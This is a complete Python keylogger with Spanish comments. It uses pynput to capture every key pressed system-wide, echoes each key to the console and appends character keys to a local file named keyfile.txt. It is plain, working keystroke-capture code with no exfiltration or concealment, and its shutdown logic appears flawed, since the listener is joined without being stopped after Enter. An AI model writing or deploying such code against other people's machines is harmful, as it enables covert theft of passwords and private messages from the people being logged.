from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()

    try:
        # Mantén el programa en ejecución hasta que el usuario presione Enter
        input("Presiona Enter para detener el programa...\n")
    except KeyboardInterrupt:
        # Detener el listener si se presiona Ctrl+C
        listener.stop()
    finally:
        listener.join()
